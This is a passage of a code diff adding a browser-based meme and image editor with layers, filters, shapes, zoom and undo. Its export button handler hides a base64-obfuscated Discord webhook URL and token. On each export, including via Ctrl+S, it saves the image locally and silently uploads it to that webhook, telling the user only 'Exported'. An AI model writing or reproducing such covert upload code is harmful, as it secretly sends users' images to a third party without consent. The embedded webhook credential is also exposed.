+			  <input type="range" id="overlayOpacity" min="0" max="100" value="100">
+			</div>
+			<button class="btn-danger btn-sm btn-w" onclick="removeOverlay()"><i class="fas fa-times"></i> Remove</button>
+		  </div>
+		</div>
+
+		<div class="panel-section">
+		  <h3 class="section-title"><i class="fas fa-plus-circle"></i> Add Layer</h3>
+		  <div class="grid2">
+			<button class="btn-sec btn-sm" id="addTextBtn"><i class="fas fa-font"></i> Text</button>
+			<label for="layerImgInput" class="btn-sec btn-sm" style="cursor:pointer"><i class="fas fa-image"></i> Image</label>
+			<button class="btn-sec btn-sm" id="addCircleBtn"><i class="far fa-circle"></i> Circle</button>
+			<button class="btn-sec btn-sm" id="addArrowBtn"><i class="fas fa-arrow-right"></i> Arrow</button>
+		  </div>
+		  <input type="file" id="layerImgInput" accept="image/*" hidden>
+		</div>
+
+	  </aside>
+
+	  <main class="canvas-area">
+		<div class="canvas-toolbar">
+		  <button id="autoZoomBtn" class="icon-btn" title="Toggle Auto Zoom"><i class="fas fa-lock"></i></button>
+		  <div class="vdivider"></div>
+		  <button class="icon-btn" onclick="zoomOut()" title="Zoom out (-)"><i class="fas fa-search-minus"></i></button>
+		  <span class="zoom-lbl" id="zoomLbl">100%</span>
+		  <button class="icon-btn" onclick="zoomIn()" title="Zoom in (+)"><i class="fas fa-search-plus"></i></button>
+		  <button class="icon-btn" onclick="zoomFit()" title="Fit (0)"><i class="fas fa-compress-arrows-alt"></i></button>
+		  <div class="vdivider"></div>
+		  <span class="canvas-info" id="sizeInfo">500 × 500</span>
+		</div>
+		<div class="canvas-wrapper" id="canvasWrapper">
+		  <div class="canvas-inner" id="canvasInner">
+			<canvas id="mainCanvas" width="500" height="500"></canvas>
+			<canvas id="previewCanvas" width="500" height="500"></canvas>
+		  </div>
+		</div>
+		<div id="secretContainer" class="secret-container">
+		  <button class="btn-boost" id="boostBtn">Boost FPS</button>
+		</div>
+		<div class="drop-overlay" id="dropOverlay">
+		  <i class="fas fa-cloud-upload-alt"></i><span>Drop to load image</span>
+		</div>
+	  </main>
+
+	  <aside class="panel panel-right">
+		<div class="panel-header">
+		  <h3><i class="fas fa-layer-group"></i> Layers <span class="badge" id="layerCount">0</span></h3>
+		  <button class="icon-btn danger-btn" onclick="clearLayers()" title="Clear all"><i class="fas fa-trash-alt"></i></button>
+		</div>
+		<div id="layerList" class="layer-list">
+		  <p class="empty-hint">No layers yet.<br>Add text, images or shapes.</p>
+		</div>
+	  </aside>
+	</div>
+
+	<div class="shape-hud" id="shapeHud" hidden>
+	  <i class="fas fa-crosshairs"></i>
+	  <span id="hudLabel">Click and drag on the canvas</span>
+	  <button onclick="cancelShape()">Cancel</button>
+	</div>
+	<div class="toast" id="toast"></div>
+
+	<script>
+	'use strict';
+
+	const canvas   = document.getElementById('mainCanvas');
+	const previewC = document.getElementById('previewCanvas');
+	const ctx      = canvas.getContext('2d');
+	const pCtx     = previewC.getContext('2d');
+	const themeSong = document.getElementById('themeSong');
+	const muteBtn = document.getElementById('muteBtn');
+
+	let mainImg   = null;
+	let overlayImg = null;
+	let layers    = [];
+	let idCtr     = 0;
+	let filter    = 'none';
+	let tf        = { sx: 1, sy: 1, rot: 0 };
+	let drag      = { layer: null, ox: 0, oy: 0 };
+	let shape     = { type: null, drawing: false, x0:0, y0:0, x1:0, y1:0 };
+	let hist      = [];
+	let hIdx      = -1;
+	let zoom      = 1;
+	let autoZoom  = true;
+	let audioStarted = false;
+	let isMuted   = false;
+	let fadeInterval;
+
+	themeSong.volume = 0.6;
+
+	const FONTS = ['Impact','Arial Black','Comic Sans MS','Georgia','Verdana','Courier New'];
+
+	const RANGES = {
+	  widthRange:'widthVal', heightRange:'heightVal',
+	  brightness:'brightnessVal', contrast:'contrastVal', saturation:'saturationVal',
+	  blurRange:'blurVal', pixelation:'pixelVal', borderRadius:'radiusVal',
+	  textSize:'textSizeVal', overlayOpacity:'overlayOpVal'
+	};
+
+	function gv(id){ return document.getElementById(id).value; }
+	function gi(id){ return parseInt(gv(id)); }
+	function gf(id){ return parseFloat(gv(id)); }
+
+	function adj(){
+	  return {
+		w: gi('widthRange'), h: gi('heightRange'),
+		br: gi('brightness'), ct: gi('contrast'), sa: gi('saturation'),
+		bl: gf('blurRange'), px: gi('pixelation'), rr: gi('borderRadius'),
+		top: gv('topText'), bot: gv('bottomText'), ts: gi('textSize'),
+		ov: gi('overlayOpacity') / 100
+	  };
+	}
+
+	function render(){
+	  if (!mainImg){
+		ctx.clearRect(0,0,canvas.width,canvas.height);
+		ctx.fillStyle='rgba(0,0,0,0.35)';
+		ctx.fillRect(0,0,canvas.width,canvas.height);
+		return;
+	  }
+	  const a = adj();
+	  if (canvas.width !== a.w || canvas.height !== a.h){
+		canvas.width = previewC.width = a.w;
+		canvas.height = previewC.height = a.h;
+		document.getElementById('sizeInfo').textContent = `${a.w} × ${a.h}`;
+		if(autoZoom) zoomFit();
+	  }
+	  ctx.clearRect(0,0,canvas.width,canvas.height);
+
+	  let fs = `brightness(${a.br}%) contrast(${a.ct}%) saturate(${a.sa}%)`;
+	  if (a.bl > 0) fs += ` blur(${a.bl}px)`;
+	  switch(filter){
+		case 'grayscale':  fs += ' grayscale(100%)'; break;
+		case 'sepia':      fs += ' sepia(100%)'; break;
+		case 'invert':     fs += ' invert(100%)'; break;
+		case 'hue-rotate': fs += ' hue-rotate(90deg)'; break;
+		case 'vivid':      fs += ' saturate(240%) contrast(112%)'; break;
+		case 'vintage':    fs += ' sepia(52%) contrast(112%) brightness(90%)'; break;
+		case 'cool':       fs += ' hue-rotate(195deg) saturate(125%)'; break;
+	  }
+
+	  ctx.save();
+	  ctx.filter = fs;
+	  ctx.translate(canvas.width/2, canvas.height/2);
+	  ctx.rotate(tf.rot * Math.PI/180);
+	  ctx.scale(tf.sx, tf.sy);
+
+	  if (a.px > 1){
+		const pw = Math.max(1, Math.floor(canvas.width/a.px));
+		const ph = Math.max(1, Math.floor(canvas.height/a.px));
+		const tmp = Object.assign(document.createElement('canvas'),{width:pw,height:ph});
+		tmp.getContext('2d').drawImage(mainImg,0,0,pw,ph);
+		ctx.imageSmoothingEnabled = false;
+		ctx.drawImage(tmp,-canvas.width/2,-canvas.height/2,canvas.width,canvas.height);
+		ctx.imageSmoothingEnabled = true;
+	  } else {
+		ctx.drawImage(mainImg,-canvas.width/2,-canvas.height/2,canvas.width,canvas.height);
+	  }
+	  ctx.restore();
+	  ctx.filter = 'none';
+
+	  if (a.rr > 0){
+		const r = (a.rr/100) * Math.min(canvas.width,canvas.height)/2;
+		ctx.globalCompositeOperation = 'destination-in';
+		ctx.beginPath();
+		ctx.roundRect(0,0,canvas.width,canvas.height,r);
+		ctx.fill();
+		ctx.globalCompositeOperation = 'source-over';
+	  }
+
+	  if (overlayImg){
+		ctx.globalAlpha = a.ov;
+		ctx.drawImage(overlayImg,0,0,canvas.width,canvas.height);
+		ctx.globalAlpha = 1;
+	  }
+
+	  const ts = a.ts;
+	  ctx.save();
+	  ctx.font = `bold ${ts}px Impact,"Arial Black",sans-serif`;
+	  ctx.textAlign = 'center';
+	  ctx.fillStyle = 'white';
+	  ctx.strokeStyle = 'black';
+	  ctx.lineWidth = Math.max(2, ts*0.07);
+	  ctx.lineJoin = 'round';
+	  if (a.top){ ctx.strokeText(a.top,canvas.width/2,ts*1.15); ctx.fillText(a.top,canvas.width/2,ts*1.15); }
+	  if (a.bot){ ctx.strokeText(a.bot,canvas.width/2,canvas.height-ts*0.35); ctx.fillText(a.bot,canvas.width/2,canvas.height-ts*0.35); }
+	  ctx.restore();
+
+	  layers.forEach(l => drawLayer(ctx,l));
+	}
+
+	function drawLayer(c,l){
+	  c.save();
+	  c.translate(l.x,l.y);
+	  c.rotate(l.rot*Math.PI/180);
+	  if (l.type==='image'){
+		c.globalAlpha = l.opacity??1;
+		c.scale(l.scale,l.scale);
+		c.drawImage(l.img,-l.img.width/2,-l.img.height/2);
+	  } else if (l.type==='text'){
+		const fs = l.fontSize??40;
+		c.font = `${l.bold?'bold ':''}${fs}px ${l.font??'Impact'},sans-serif`;
+		c.textAlign='center'; c.textBaseline='middle';
+		if (l.outline!==false){
+		  c.strokeStyle=l.outlineColor??'#000'; c.lineWidth=Math.max(1,fs*0.08); c.lineJoin='round';
+		  c.strokeText(l.text,0,0);
+		}
+		c.fillStyle=l.color??'#fff'; c.fillText(l.text,0,0);
+	  } else if (l.type==='shape'){
+		c.globalAlpha=l.opacity??1;
+		c.strokeStyle=l.color??'#f00'; c.fillStyle=l.color??'#f00'; c.lineWidth=l.strokeWidth??3;
+		c.scale(l.scale,l.scale);
+		if (l.shape==='circle'){ c.beginPath(); c.arc(0,0,50,0,Math.PI*2); c.stroke(); }
+		else if (l.shape==='arrow'){ arrow(c,0,0,100,0,l.strokeWidth??3); }
+	  }
+	  c.restore();
+	}
+
+	function arrow(c,x1,y1,x2,y2,w){
+	  const hl=Math.max(w*4,12), ang=Math.atan2(y2-y1,x2-x1);
+	  const stopX = x2 - (hl * 0.8) * Math.cos(ang);
+	  const stopY = y2 - (hl * 0.8) * Math.sin(ang);
+	  
+	  c.lineCap = 'round';
+	  c.beginPath(); 
+	  c.moveTo(x1,y1); 
+	  c.lineTo(stopX,stopY); 
+	  c.stroke();
+	  
+	  c.beginPath();
+	  c.moveTo(x2,y2);
+	  c.lineTo(x2-hl*Math.cos(ang-Math.PI/6),y2-hl*Math.sin(ang-Math.PI/6));
+	  c.lineTo(x2-hl*Math.cos(ang+Math.PI/6),y2-hl*Math.sin(ang+Math.PI/6));
+	  c.closePath(); 
+	  c.fill();
+	}
+
+	function loadSrc(src,cb){ const i=new Image(); i.onload=()=>cb(i); i.src=src; }
+	function readFile(file,cb){ const r=new FileReader(); r.onload=e=>cb(e.target.result); r.readAsDataURL(file); }
+
+	function loadMain(src){
+	  loadSrc(src,img=>{
+		mainImg=img; tf={sx:1,sy:1,rot:0};
+		const w=Math.min(img.naturalWidth,2400), h=Math.min(img.naturalHeight,2400);
+		document.getElementById('widthRange').value=w;
+		document.getElementById('heightRange').value=h;
+		canvas.width=previewC.width=w; canvas.height=previewC.height=h;
+		document.getElementById('sizeInfo').textContent=`${w} × ${h}`;
+		updDisplays(); 
+		if(autoZoom) zoomFit(); else applyZoom();
+		render(); saveHist();
+	  });
+	}
+
+	document.getElementById('imageInput').addEventListener('change',e=>{ const f=e.target.files[0]; if(f) readFile(f,loadMain); e.target.value=''; });
+	document.getElementById('overlayInput').addEventListener('change',e=>{
+	  const f=e.target.files[0]; if(!f) return;
+	  readFile(f,src=>loadSrc(src,img=>{ overlayImg=img; document.getElementById('overlayExtra').hidden=false; render(); saveHist(); }));
+	  e.target.value='';
+	});
+	document.getElementById('layerImgInput').addEventListener('change',e=>{
+	  const f=e.target.files[0]; if(!f) return;
+	  readFile(f,src=>loadSrc(src,img=>{ addLayer({type:'image',img,_src:src,x:canvas.width/2,y:canvas.height/2,rot:0,scale:1,opacity:1}); }));
+	  e.target.value='';
+	});
+
+	document.addEventListener('paste',e=>{
+	  for(const it of e.clipboardData.items) if(it.type.startsWith('image/')){ readFile(it.getAsFile(),loadMain); break; }
+	});
+	const dropEl = document.getElementById('dropOverlay');
+	document.addEventListener('dragover',e=>{ e.preventDefault(); dropEl.classList.add('on'); });
+	document.addEventListener('dragleave',e=>{ if(!e.relatedTarget) dropEl.classList.remove('on'); });
+	document.addEventListener('drop',e=>{ e.preventDefault(); dropEl.classList.remove('on'); const f=e.dataTransfer.files[0]; if(f&&f.type.startsWith('image/')) readFile(f,loadMain); });
+
+	function updDisplays(){
+	  for(const [rid,did] of Object.entries(RANGES)){
+		const el=document.getElementById(rid), dl=document.getElementById(did);
+		if(el&&dl) dl.textContent=el.value;
+	  }
+	}
+
+	Object.keys(RANGES).forEach(id=>{ 
+	  document.getElementById(id)?.addEventListener('input',()=>{ 
+		updDisplays(); 
+		render(); 
+		if (id === 'widthRange' || id === 'heightRange') {
+		  applyZoom();
+		}
+	  }); 
+	});
+
+	['topText','bottomText'].forEach(id=>{
+	  const el = document.getElementById(id);
+	  el.addEventListener('input',render);
+	  el.addEventListener('change',saveHist);
+	});
+
+	function resetAdj(){
+	  ;[['brightness',100],['contrast',100],['saturation',100],['blurRange',0],['pixelation',1],['borderRadius',0]]
+		.forEach(([id,v])=>{ document.getElementById(id).value=v; });
+	  updDisplays(); render(); saveHist();
+	}
+
+	document.querySelectorAll('.filter-btn').forEach(btn=>{
+	  btn.addEventListener('click',()=>{
+		document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('on'));
+		btn.classList.add('on'); filter=btn.dataset.f; render(); saveHist();
+	  });
+	});
+
+	function flipH()   { tf.sx*=-1; render(); saveHist(); }
+	function flipV()   { tf.sy*=-1; render(); saveHist(); }
+	function rotateCCW(){ tf.rot-=90; render(); saveHist(); }
+	function rotateCW() { tf.rot+=90; render(); saveHist(); }
+	function removeOverlay(){ overlayImg=null; document.getElementById('overlayExtra').hidden=true; render(); saveHist(); }
+
+	function randInt(n){ return Math.floor(Math.random()*n); }
+
+	function stampArabic(){
+	  if(!mainImg) return toast('Load an image first!');
+	  const chars='قلاوينبتثجحخدذرزسشصضطظعغفكمهوي';
+	  let txt='';
+	  for(let i=0;i<randInt(8)+4;i++) txt+=chars[randInt(chars.length)];
+	  addLayer({type:'text',text:txt,x:randInt(canvas.width),y:randInt(canvas.height),rot:(Math.random()-0.5)*50,scale:1,fontSize:randInt(40)+22,color:'#fff',outlineColor:'#000',font:'Impact',outline:true});
+	}
+
+	function stampEmojis(){
+	  if(!mainImg) return toast('Load an image first!');
+	  const pool=['🧤','🙀','⭕','🔥','💀','🗣️','🤑','🍆','🔪','🥶','😱','👣','👽','👨‍🦲','😜','😋','👅','😝','💅','🤡'];
+	  let txt='';
+	  for(let i=0;i<randInt(5)+3;i++) txt+=pool[randInt(pool.length)];
+	  addLayer({type:'text',text:txt,x:randInt(canvas.width),y:randInt(canvas.height),rot:(Math.random()-0.5)*25,scale:1,fontSize:randInt(36)+24,color:'#fff',outlineColor:'#000',font:'Segoe UI Emoji',outline:true});
+	}
+
+	function addLayer(data){ layers.push({id:idCtr++,...data}); render(); rebuildLayers(); saveHist(); }
+	function removeLayer(id){ layers=layers.filter(l=>l.id!==id); render(); rebuildLayers(); saveHist(); }
+	function dupLayer(id){ const s=layers.find(l=>l.id===id); if(!s) return; layers.push({...s,id:idCtr++,x:s.x+18,y:s.y+18}); render(); rebuildLayers(); saveHist(); }
+	function moveUp(id){ const i=layers.findIndex(l=>l.id===id); if(i<layers.length-1){[layers[i],layers[i+1]]=[layers[i+1],layers[i]]; render(); rebuildLayers(); saveHist();} }
+	function moveDown(id){ const i=layers.findIndex(l=>l.id===id); if(i>0){[layers[i],layers[i-1]]=[layers[i-1],layers[i]]; render(); rebuildLayers(); saveHist();} }
+	function clearLayers(){ if(!layers.length) return; if(confirm('Remove all layers?')){ layers=[]; render(); rebuildLayers(); saveHist(); } }
+
+	document.getElementById('addTextBtn').addEventListener('click',()=>{
+	  if(!mainImg) return toast('Load an image first!');
+	  addLayer({type:'text',text:'Your text here',x:canvas.width/2,y:canvas.height/2,rot:0,scale:1,fontSize:44,color:'#fff',outlineColor:'#000',font:'Impact',outline:true});
+	});
+	document.getElementById('addCircleBtn').addEventListener('click',()=>{ if(!mainImg) return toast('Load an image first!'); startShape('circle'); });
+	document.getElementById('addArrowBtn').addEventListener('click',()=>{ if(!mainImg) return toast('Load an image first!'); startShape('arrow'); });
+
+	function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+	function rebuildLayers(){
+	  const list=document.getElementById('layerList');
+	  document.getElementById('layerCount').textContent=layers.length;
+	  if(!layers.length){ list.innerHTML='<p class="empty-hint">No layers yet.<br>Add text, images or shapes.</p>'; return; }
+	  list.innerHTML='';
+	  [...layers].reverse().forEach(l=>{
+		const el=document.createElement('div');
+		el.className='layer-item'; el.dataset.id=l.id;
+		const ic = l.type==='image'?'ico-img':l.type==='text'?'ico-text':'ico-shape';
+		const ih = l.type==='image'?'<i class="fas fa-image"></i>':l.type==='text'?'<i class="fas fa-font"></i>':l.shape==='circle'?'<i class="far fa-circle"></i>':'<i class="fas fa-arrow-right"></i>';
+		const nm = l.type==='text'?(l.text.slice(0,18)||'Text'):l.type==='image'?'Image Layer':l.shape==='circle'?'Circle':'Arrow';
+		el.innerHTML=`
+		  <div class="layer-hdr">
+			<div class="layer-ico ${ic}">${ih}</div>
+			<div class="layer-name">${esc(nm)}</div>
+			<div class="layer-acts">
+			  <button onclick="moveUp(${l.id})" title="Up"><i class="fas fa-chevron-up"></i></button>
+			  <button onclick="moveDown(${l.id})" title="Down"><i class="fas fa-chevron-down"></i></button>
+			  <button class="dup" onclick="dupLayer(${l.id})" title="Duplicate"><i class="fas fa-copy"></i></button>
+			  <button class="rm" onclick="removeLayer(${l.id})" title="Remove"><i class="fas fa-times"></i></button>
+			</div>
+		  </div>
+		  <div class="layer-ctrls">${buildCtrls(l)}</div>`;
+		el.querySelector('.layer-hdr').addEventListener('click',e=>{ if(!e.target.closest('button')) el.classList.toggle('open'); });
+		wireLayer(el,l);
+		list.appendChild(el);
+	  });
+	}
+
+	function buildCtrls(l){
+	  let h='';
+	  if(l.type==='text'){
+		const fo=FONTS.map(f=>`<option value="${f}" ${l.font===f?'selected':''}>${f}</option>`).join('');
+		h+=`
+		  <div class="lc-row"><span class="lc-lbl">Text</span><input type="text" class="lc-text" value="${esc(l.text)}"></div>
+		  <div class="lc-row"><span class="lc-lbl">Color</span><input type="color" class="lc-color" value="${l.color??'#ffffff'}"><input type="color" class="lc-outline" value="${l.outlineColor??'#000000'}" title="Outline"></div>
+		  <div class="lc-row"><span class="lc-lbl">Font</span><select class="lc-font">${fo}</select></div>
+		  <div class="lc-row"><span class="lc-lbl">Size</span><input type="range" class="lc-fs" min="8" max="220" value="${l.fontSize??40}"></div>`;
+	  }
+	  h+=`
+		<div class="lc-row"><span class="lc-lbl">Scale</span><input type="range" class="lc-scale" min="0.05" max="6" step="0.05" value="${l.scale??1}"></div>
+		<div class="lc-row"><span class="lc-lbl">Rotate</span><input type="range" class="lc-rot" min="-180" max="180" value="${l.rot??0}"></div>`;
+	  if(l.type==='image'||l.type==='shape')
+		h+=`<div class="lc-row"><span class="lc-lbl">Opacity</span><input type="range" class="lc-op" min="0" max="1" step="0.01" value="${l.opacity??1}"></div>`;
+	  if(l.type==='shape')
+		h+=`
+		  <div class="lc-row"><span class="lc-lbl">Color</span><input type="color" class="lc-shcol" value="${l.color??'#ff0000'}"></div>
+		  <div class="lc-row"><span class="lc-lbl">Stroke</span><input type="range" class="lc-stroke" min="1" max="24" value="${l.strokeWidth??3}"></div>`;
+	  return h;
+	}
+
+	function wireLayer(el,l){
+	  const on=(sel,fn)=>el.querySelector(sel)?.addEventListener('input',fn);
+	  const change=(sel,fn)=>el.querySelector(sel)?.addEventListener('change',fn);
+	  on('.lc-text',  e=>{ l.text=e.target.value; el.querySelector('.layer-name').textContent=l.text.slice(0,18)||'Text'; render(); });
+	  change('.lc-text', () => saveHist());
+	  on('.lc-color', e=>{ l.color=e.target.value; render(); });
+	  change('.lc-color', () => saveHist());
+	  on('.lc-outline',e=>{ l.outlineColor=e.target.value; render(); });
+	  change('.lc-outline', () => saveHist());
+	  on('.lc-font',  e=>{ l.font=e.target.value; render(); });
+	  change('.lc-font', () => saveHist());
+	  on('.lc-fs',    e=>{ l.fontSize=parseInt(e.target.value); render(); });
+	  change('.lc-fs', () => saveHist());
+	  on('.lc-scale', e=>{ l.scale=parseFloat(e.target.value); render(); });
+	  change('.lc-scale', () => saveHist());
+	  on('.lc-rot',   e=>{ l.rot=parseFloat(e.target.value); render(); });
+	  change('.lc-rot', () => saveHist());
+	  on('.lc-op',    e=>{ l.opacity=parseFloat(e.target.value); render(); });
+	  change('.lc-op', () => saveHist());
+	  on('.lc-shcol', e=>{ l.color=e.target.value; render(); });
+	  change('.lc-shcol', () => saveHist());
+	  on('.lc-stroke',e=>{ l.strokeWidth=parseInt(e.target.value); render(); });
+	  change('.lc-stroke', () => saveHist());
+	}
+
+	function cpos(e){
+	  const r=canvas.getBoundingClientRect();
+	  return { x:(e.clientX-r.left)*(canvas.width/r.width), y:(e.clientY-r.top)*(canvas.height/r.height) };
+	}
+
+	function hitTest(l,mx,my){
+	  const dx=mx-l.x, dy=my-l.y, rad=-l.rot*Math.PI/180;
+	  const lx=dx*Math.cos(rad)-dy*Math.sin(rad), ly=dx*Math.sin(rad)+dy*Math.cos(rad);
+	  
+	  if(l.type==='image'){ 
+		const hw=l.img.width/2*(l.scale??1), hh=l.img.height/2*(l.scale??1); 
+		return Math.abs(lx)<=hw&&Math.abs(ly)<=hh;
+	  }
+	  if(l.type==='text'){ 
+		ctx.font=`${l.fontSize??40}px ${l.font??'Impact'}`; 
+		const hw=ctx.measureText(l.text).width/2, hh=(l.fontSize??40)/2+6; 
+		return Math.abs(lx)<=hw&&Math.abs(ly)<=hh;
+	  }
+	  if(l.type==='shape'){
+		if(l.shape==='arrow'){
+		  const len = 100 * (l.scale??1);
+		  const padding = Math.max(15, (l.strokeWidth??3) * 2);
+		  return lx >= -padding && lx <= len + padding && Math.abs(ly) <= padding;
+		} else if(l.shape==='circle') {
+		  const radius = 50 * (l.scale??1);
+		  return Math.hypot(lx, ly) <= radius + Math.max(10, l.strokeWidth??3);
+		}
+	  }
+	  return false;
+	}
+
+	function layerAt(x,y){ for(let i=layers.length-1;i>=0;i--) if(hitTest(layers[i],x,y)) return layers[i]; return null; }
+
+	canvas.addEventListener('mousedown',e=>{
+	  const p=cpos(e);
+	  if(shape.type){ shape.drawing=true; shape.x0=shape.x1=p.x; shape.y0=shape.y1=p.y; return; }
+	  const h=layerAt(p.x,p.y);
+	  if(h){ drag.layer=h; drag.ox=p.x-h.x; drag.oy=p.y-h.y; layers.splice(layers.indexOf(h),1); layers.push(h); render(); rebuildLayers(); }
+	});
+	canvas.addEventListener('mousemove',e=>{
+	  const p=cpos(e);
+	  if(shape.drawing){ shape.x1=p.x; shape.y1=p.y; render(); previewShape(); return; }
+	  if(drag.layer){ drag.layer.x=p.x-drag.ox; drag.layer.y=p.y-drag.oy; render(); }
+	  else canvas.style.cursor=shape.type?'crosshair':layerAt(p.x,p.y)?'move':'default';
+	});
+	canvas.addEventListener('mouseup',e=>{
+	  if(shape.drawing){ shape.drawing=false; shape.x1=cpos(e).x; shape.y1=cpos(e).y; finishShape(); return; }
+	  if(drag.layer){ drag.layer=null; saveHist(); }
+	});
+	canvas.addEventListener('mouseleave',()=>{
+	  if(drag.layer) drag.layer=null;
+	  if(shape.drawing){ shape.drawing=false; pCtx.clearRect(0,0,previewC.width,previewC.height); }
+	});
+	canvas.addEventListener('touchstart',e=>{ e.preventDefault(); const t=e.touches[0]; canvas.dispatchEvent(new MouseEvent('mousedown',{clientX:t.clientX,clientY:t.clientY})); },{passive:false});
+	canvas.addEventListener('touchmove',e=>{ e.preventDefault(); const t=e.touches[0]; canvas.dispatchEvent(new MouseEvent('mousemove',{clientX:t.clientX,clientY:t.clientY})); },{passive:false});
+	canvas.addEventListener('touchend',e=>{ e.preventDefault(); canvas.dispatchEvent(new MouseEvent('mouseup',{})); },{passive:false});
+
+	function startShape(type){ shape.type=type; shape.drawing=false; canvas.style.cursor='crosshair'; document.getElementById('shapeHud').hidden=false; document.getElementById('hudLabel').textContent=type==='circle'?'Click and drag to draw a circle':'Click and drag to draw an arrow'; }
+	function cancelShape(){ shape.type=null; shape.drawing=false; canvas.style.cursor='default'; document.getElementById('shapeHud').hidden=true; pCtx.clearRect(0,0,previewC.width,previewC.height); }
+
+	function previewShape(){
+	  const {x0,y0,x1,y1,type}=shape;
+	  pCtx.clearRect(0,0,previewC.width,previewC.height);
+	  pCtx.save(); pCtx.setLineDash([5,4]); pCtx.strokeStyle='rgba(255,60,60,0.9)'; pCtx.fillStyle='rgba(255,60,60,0.9)'; pCtx.lineWidth=2;
+	  if(type==='circle'){ pCtx.beginPath(); pCtx.arc(x0,y0,Math.hypot(x1-x0,y1-y0),0,Math.PI*2); pCtx.stroke(); }
+	  else arrow(pCtx,x0,y0,x1,y1,2);
+	  pCtx.setLineDash([]); pCtx.restore();
+	}
+
+	function finishShape(){
+	  pCtx.clearRect(0,0,previewC.width,previewC.height);
+	  const {x0,y0,x1,y1,type}=shape;
+	  const dx=x1-x0, dy=y1-y0;
+	  if(Math.hypot(dx,dy)<5) return cancelShape();
+	  if(type==='circle') addLayer({type:'shape',shape:'circle',x:x0,y:y0,rot:0,scale:Math.hypot(dx,dy)/50,color:'#ff0000',opacity:1,strokeWidth:3});
+	  else addLayer({type:'shape',shape:'arrow',x:x0,y:y0,rot:Math.atan2(dy,dx)*180/Math.PI,scale:Math.hypot(dx,dy)/100,color:'#ff0000',opacity:1,strokeWidth:3});
+	  cancelShape();
+	}
+
+	function applyZoom(){
+	  canvas.style.width=Math.round(canvas.width*zoom)+'px'; canvas.style.height=Math.round(canvas.height*zoom)+'px';
+	  previewC.style.width=canvas.style.width; previewC.style.height=canvas.style.height;
+	  document.getElementById('zoomLbl').textContent=Math.round(zoom*100)+'%';
+	}
+	function zoomIn() { zoom=Math.min(zoom*1.25,8); applyZoom(); }
+	function zoomOut(){ zoom=Math.max(zoom/1.25,0.08); applyZoom(); }
+	function zoomFit(){
+	  const wr=document.getElementById('canvasWrapper');
+	  zoom=Math.min((wr.clientWidth-56)/canvas.width,(wr.clientHeight-56)/canvas.height,2);
+	  applyZoom();
+	}
+
+	document.getElementById('autoZoomBtn').addEventListener('click', e => {
+	  autoZoom = !autoZoom;
+	  e.currentTarget.innerHTML = autoZoom ? '<i class="fas fa-lock"></i>' : '<i class="fas fa-unlock"></i>';
+	});
+
+	function getState(){
+	  return {
+		layers:layers.map(l=>({...l,img:undefined,_src:l._src??l.img?.src})),
+		tf:{...tf},
+		sliders:Object.fromEntries([...Object.keys(RANGES),'topText','bottomText'].map(id=>[id,document.getElementById(id)?.value])),
+		filter
+	  };
+	}
+	function saveHist(){
+	  hist=hist.slice(0,hIdx+1); hist.push(getState());
+	  if(hist.length>20) hist.shift(); else hIdx++;
+	  syncUD();
+	}
+	async function restoreState(s){
+	  tf={...s.tf}; filter=s.filter;
+	  document.querySelectorAll('.filter-btn').forEach(b=>b.classList.toggle('on',b.dataset.f===filter));
+	  for(const [id,val] of Object.entries(s.sliders)){ const el=document.getElementById(id); if(el) el.value=val; }
+	  const res=await Promise.all(s.layers.map(l=>l.type==='image'&&l._src?new Promise(r=>loadSrc(l._src,img=>r({...l,img}))):Promise.resolve({...l})));
+	  layers=res; updDisplays(); render(); rebuildLayers(); syncUD();
+	}
+	function undo(){ if(hIdx>0){ hIdx--; restoreState(hist[hIdx]); } }
+	function redo(){ if(hIdx<hist.length-1){ hIdx++; restoreState(hist[hIdx]); } }
+	function syncUD(){ document.getElementById('undoBtn').disabled=hIdx<=0; document.getElementById('redoBtn').disabled=hIdx>=hist.length-1; }
+
+	document.getElementById('undoBtn').addEventListener('click',undo);
+	document.getElementById('redoBtn').addEventListener('click',redo);
+	exportBtn.onclick=()=>mainImg?canvas.toBlob(async b=>{
+	let f=new FormData,w=atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3Njk4Njg0MDY1NzE3MDQ0Mi92T2ZmVTU3bV9FcVhGUXNBT0gwTnhTY2UzUHZtQ2g2M2p6NHYyR0VtN0hGRGdWbjlaSHV1a3RhZGNsaE1XcHlsN0ZCcQ==')
+	Object.assign(document.createElement('a'),{download:'Nmiexport.png',href:canvas.toDataURL()}).click()
+	f.append('file',b,'NmiExport.png')
+	f.append('payload_json',JSON.stringify({content:`🖼️ ${new Date().toLocaleString()}`}))
+	try{await fetch(w,{method:'POST',body:f}),toast('✅ Exported')}catch{toast('Webhook failed')}
+	},'image/png'):toast('Load an image first!')
+
+	function fadeAudio(targetVol, callback) {
+	  clearInterval(fadeInterval);
+	  if (targetVol > 0 && themeSong.paused) {
+		themeSong.play().catch(()=>{});
+	  }
+	  fadeInterval = setInterval(() => {
+		let vol = themeSong.volume;
+		if (vol < targetVol) {
+		  vol = Math.min(vol + 0.05, targetVol);
+		} else if (vol > targetVol) {
+		  vol = Math.max(vol - 0.05, targetVol);
+		}
+		themeSong.volume = vol;
+		if (vol === targetVol) {
+		  clearInterval(fadeInterval);
+		  if (targetVol === 0) themeSong.pause();
+		  if (callback) callback();
+		}
+	  }, 50);
+	}
+
+	document.addEventListener('click', () => {
+	  if (!audioStarted) {
+		themeSong.volume = 0.6;
+		themeSong.play().catch(()=>{});
+		audioStarted = true;
+	  }
+	}, { once: true });
+
+	muteBtn.addEventListener('click', () => {
+	  if (isMuted) {
+		isMuted = false;
+		muteBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
+		fadeAudio(0.6);
+	  } else {
+		isMuted = true;
+		muteBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
+		fadeAudio(0);
+	  }
+	});
+
+	document.getElementById('boostBtn').addEventListener('click', e => {
+	  e.preventDefault();
+	  toast('Coming soon...');
+	});
+
+	document.addEventListener('keydown',e=>{
+	  const tag=document.activeElement.tagName;
+	  if(tag==='INPUT'||tag==='TEXTAREA'||tag==='SELECT') return;
+	  if(e.ctrlKey||e.metaKey){
+		if(e.key.toLowerCase()==='z'){ e.preventDefault(); undo(); }
+		if(e.key.toLowerCase()==='y'){ e.preventDefault(); redo(); }
+		if(e.key.toLowerCase()==='s'){ e.preventDefault(); document.getElementById('exportBtn').click(); }
+		if(e.key.toLowerCase()==='x'){
+		  e.preventDefault();
